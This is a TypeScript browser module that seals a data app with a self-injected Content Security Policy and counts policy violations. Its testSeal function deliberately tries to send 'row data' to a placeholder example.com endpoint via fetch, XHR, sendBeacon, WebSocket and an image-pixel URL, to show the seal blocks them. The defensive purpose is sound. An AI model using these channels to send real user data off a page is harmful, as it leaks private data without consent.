/**
 * Sealing the page.
 *
 * A ledger that says "nothing left this tab" is the page marking its own
 * homework. This is the part that isn't: once the engine has booted, the page
 * injects a Content Security Policy that revokes its own network access, and
 * from that moment the *browser* refuses every outbound channel — fetch, XHR,
 * WebSocket, sendBeacon, image pixels, form posts.
 *
 * Chrome honours a policy delivered this way after parse, and policies compose
 * by intersection, so this can only ever tighten what the document already
 * allows. Nothing in this app needs the network after startup: DuckDB's wasm
 * and worker are already instantiated, the charts are bundled, and the fonts
 * are the system's.
 *
 * The point is that the guarantee stops being a claim. A sceptical user can
 * open DevTools, watch a violation get logged, and read the policy out of
 * document.head themselves.
 */

const POLICY = [
  "connect-src 'none'", // fetch, XHR, WebSocket, EventSource, sendBeacon
  "form-action 'none'", // no posting the data out through a form
  "img-src data:", // pixel beacons carry data in the URL; only inline images remain
  "media-src 'none'",
  "object-src 'none'",
  "frame-src 'none'", // no iframe to relay through
  "worker-src 'self' blob:", // DuckDB's worker already exists; keep it alive
].join('; ');

let sealed = false;
const listeners = new Set<(state: SealState) => void>();

export interface SealState {
  sealed: boolean;
  policy: string;
  violations: number;
  lastViolation: string | null;
}

let violations = 0;
let lastViolation: string | null = null;

/**
 * Any attempt to reach the network after sealing lands here. In normal use this
 * counter stays at zero forever; if it ever moves, the user should see it.
 */
document.addEventListener('securitypolicyviolation', (e) => {
  const event = e as SecurityPolicyViolationEvent;
  violations++;
  lastViolation = `${event.violatedDirective} blocked ${event.blockedURI || 'a request'}`;
  emit();
});

export function seal(): SealState {
  if (!sealed) {
    const meta = document.createElement('meta');
    meta.httpEquiv = 'Content-Security-Policy';
    meta.content = POLICY;
    document.head.appendChild(meta);
    sealed = true;
    emit();
  }
  return state();
}

export function state(): SealState {
  return { sealed, policy: POLICY, violations, lastViolation };
}

export function subscribe(fn: (s: SealState) => void): () => void {
  listeners.add(fn);
  fn(state());
  return () => listeners.delete(fn);
}

function emit(): void {
  const s = state();
  for (const fn of listeners) fn(s);
}

/**
 * Tries to reach the network on purpose, so a user can watch the seal hold
 * rather than take its word for it. Returns what the browser did with each
 * attempt. Runs only when someone asks for it.
 */
export async function testSeal(): Promise<{ channel: string; blocked: boolean; detail: string }[]> {
  const target = 'https://example.com/blindfold-exfiltration-test';
  const results: { channel: string; blocked: boolean; detail: string }[] = [];
  const before = violations;

  try {
    await fetch(target, { method: 'POST', body: 'row data', mode: 'no-cors' });
    results.push({ channel: 'fetch', blocked: false, detail: 'the request went out' });
  } catch (err) {
    results.push({ channel: 'fetch', blocked: true, detail: err instanceof Error ? err.message : String(err) });
  }

  try {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', target, false);
    xhr.send('row data');
    results.push({ channel: 'XMLHttpRequest', blocked: false, detail: 'the request went out' });
  } catch (err) {
    results.push({ channel: 'XMLHttpRequest', blocked: true, detail: err instanceof Error ? err.message : String(err) });
  }

  // These two report success even when the browser refuses them, so the CSP
  // violation counter is the only honest signal.
  const beaconMark = violations;
  navigator.sendBeacon?.(target, 'row data');
  await new Promise((r) => setTimeout(r, 60));
  results.push({
    channel: 'sendBeacon',
    blocked: violations > beaconMark,
    detail: violations > beaconMark ? 'refused by the policy' : 'the browser accepted it',
  });

  const wsMark = violations;
  try {
    new WebSocket('wss://example.com/blindfold-exfiltration-test');
  } catch {
    /* some builds throw, most do not */
  }
  await new Promise((r) => setTimeout(r, 120));
  results.push({
    channel: 'WebSocket',
    blocked: violations > wsMark,
    detail: violations > wsMark ? 'refused by the policy' : 'the socket opened',
  });

  const imgMark = violations;
  const img = new Image();
  img.src = `${target}.gif?rows=leaked`;
  await new Promise((r) => setTimeout(r, 120));
  results.push({
    channel: 'image pixel',
    blocked: violations > imgMark,
    detail: violations > imgMark ? 'refused by the policy' : 'the pixel loaded',
  });

  if (violations > before) emit();
  return results;
}
